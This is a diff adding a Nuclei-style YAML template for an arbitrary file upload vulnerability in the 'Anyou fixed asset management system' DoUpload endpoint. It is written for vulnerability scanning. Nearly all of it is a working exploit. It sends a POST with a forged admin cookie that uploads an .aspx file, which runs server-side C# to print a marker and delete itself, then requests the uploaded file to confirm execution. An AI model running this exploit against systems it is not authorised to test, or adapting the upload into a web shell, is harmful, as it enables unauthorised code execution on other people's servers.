@@ -1,0 +1,49 @@
+id: AnYouGuDingZiChanGuanLiXiTong-DoUpload-File-Upload
+
+info:
+  name: 安友固定资产管理系统 DoUpload 任意文件上传
+  author: HuanXiong
+  severity: critical
+  description: |-
+    
+  reference:
+    - 
+  tags: File Upload
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+  - raw:
+      - |
+        POST /manage/Attachment/DoUpload?bocode=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        Cookie: AnnYouDevBaseAdfv3adfUserCode=admin;
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
+
+        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad
+        Content-Disposition: form-data; name="file" filename="{{username}}.aspx"
+        Content-Type: image/png
+
+        <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+        ------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
+    
+    extractors:
+      - type: regex
+        name: uploaded_path
+        regex:
+          - '(upload/[^"]+)' 
+        internal: true
+
+  - raw:
+      - |
+        GET /{{uploaded_path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+
+    matchers:
+      - type: dsl
+        name: 任意文件上传
+        dsl:
+          - "status_code==200 && contains_all(body,'pboyjnnrfipmplsukdeczudsefxmywe')"
